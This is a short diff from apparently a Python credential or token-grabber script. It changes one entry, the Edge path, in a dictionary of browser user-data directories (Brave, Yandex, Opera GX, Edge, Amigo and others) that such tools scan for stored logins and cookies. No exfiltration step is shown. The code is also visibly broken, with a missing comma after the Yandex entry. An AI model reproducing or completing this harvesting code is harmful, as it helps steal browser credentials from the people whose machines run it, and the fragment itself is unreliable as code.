@@ -53,7 +53,7 @@ def main():
         'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default'
         'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable',
-        'Edge': appdata + r'\\Microsoft\\Edge\\User Data',
+        'Edge': roaming + r'\\Microsoft\\Edge\\User Data',
         'Amigo': local + r'\\Amigo\\User Data',
         'Torch': local + r'\\Torch\\User Data',
         'Kometa': local + r'\\Kometa\\User Data',
